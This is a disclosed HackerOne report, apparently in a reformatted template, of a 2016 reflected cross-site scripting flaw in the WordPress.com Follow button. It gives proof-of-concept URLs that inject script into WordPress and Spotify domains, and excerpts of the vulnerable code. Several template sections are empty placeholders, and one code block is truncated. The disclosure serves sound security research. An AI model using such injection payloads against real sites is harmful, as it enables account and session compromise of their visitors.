# Follow Button XSS

## Metadata
- **Source:** HackerOne
- **Report:** 172574 | https://hackerone.com/reports/172574
- **Submitted:** 2016-09-28
- **Reporter:** bobrov
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
**PoC**
1) Open link
2) Click "Follow" in the bottom right-hand corner

XSS Should work on any wordpress site with this Follow button. 
fbd.isLoggedIn must be equal to false.

```
https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://labs.spotify.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://news.spotify.com/tr/&quot;&g

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**PoC**
1) Open link
2) Click "Follow" in the bottom right-hand corner

XSS Should work on any wordpress site with this Follow button. 
fbd.isLoggedIn must be equal to false.

```
https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://labs.spotify.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://news.spotify.com/tr/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
```

**Vulnerable Code**
apps.wordpress.com
```html
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {
...
"subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"9dca8606d3\" \/><input type=\"hidden\" name=\"_wp_http_referer\" 
value=\"\/support\/\"><script>alert(document.domain)<\/script>\" \/>",
"referer":"https:\/\/apps.wordpress.com\/support\/\"><script>alert(document.domain)<\/script>",
"canFollow":"1"
...
</script>
```

s2.wp.com/_static/
```js
	// Follow Site
	$actionbar.on(  'click', '.actnbr-actn-follow', function(e) {
		e.preventDefault();

		if ( fbd.isLoggedIn ) {
			showActionBarStatusMessage( '<div class="actnbr-reader">' + fbd.i18n.followedText + '</div>' );
			bumpStat( 'followed' );
			request( 'ab_subscribe_to_blog' );
		} else {
			showActionBarFollowForm();
		}
	} )
	...
		function showActionBarFollowForm() {
		var btn = $( '#actionbar .actnbr-btn' );
		btn.toggleClass( 'actnbr-hidden' );

		$( '#actionbar .actnbr-follow-bubble' ).html( ' \
			...
			<input type="hidden" name="blog_id" value="' + fbd.siteID + '"/> \
			<input type="hidden" name="source" value="' + fbd.referer + '"/> \
			<input type="hidden" name="sub-type" value="actionbar-follow"/> \
			' + fbd.subscribeNonce + ' \
			...
		');
```




</details>

---
*Analysed by Claude on 2026-05-24*
